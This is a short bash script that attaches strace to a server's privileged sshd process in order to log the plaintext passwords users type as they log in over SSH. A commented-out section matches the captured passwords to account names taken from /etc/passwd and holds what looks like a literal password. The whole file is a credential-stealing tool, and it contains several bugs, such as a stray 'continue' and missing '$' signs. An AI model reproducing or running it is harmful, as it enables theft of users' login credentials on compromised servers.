#!/usr/bin/env bash

function getpass() {
	ssh_pwd_pid=$(ps -ef | grep sshd | grep priv | awk '{print $2}')
	[[ -z $ssh_pwd_pid ]] && continue

	username=$(ps -ef | grep -v "grep" | grep -Eo "sshd.*priv" | cut -d " " -f 2)
	log_file="/root/sshd_log.$username"

	strace -p $ssh_pwd_pid -s 150 -o $log_file &

	sed -n '2p' $log_file

	while [[ ! -z $(ps -ef | grep ssh_pwd_pid) ]]; do
		success=$(grep -E "sendto.*Accepted password for.*" $log_file)
		[[ -z success ]] || break
	done
	rm $log_file
}

# while [[ true ]]; do
# done

# getpass

# grep -E "Ic3kr3am!202" ~/sshd_getpass

# for user in $(grep -vE 'nologin|false' /etc/passwd | cut -d ":" -f 1); do
# 	PASSWORD=$(grep -B 40 -E "Accepted.*$user" ~/sshd_getpass | grep "read(6" | grep -v unfinished | cut -d '"' -f 2 | sed 's/\\.//g')
# 	if [ "$PASSWORD" ]; then
# 		echo "USER: $user"
# 		echo $NEWPASS
# 	fi
# done

ssh_pwd_pid=$(ps -ef | grep sshd | grep priv | awk '{print $2}')
[[ -z $ssh_pwd_pid ]] && continue

username=$(ps -ef | grep -v "grep" | grep -Eo "sshd.*priv" | cut -d " " -f 2)
log_file="/root/sshd_log.$username"

strace -e read,sendto -p $ssh_pwd_pid -s 150 -o $log_file &

while [[ ! -z $(ps -ef | grep ssh_pwd_pid) ]]; do
	success=$(grep -B 38 -E "sendto.*Accepted password for.*" $log_file | sed -n '1p')
	[[ -z success ]] || break
done

rm $log_file
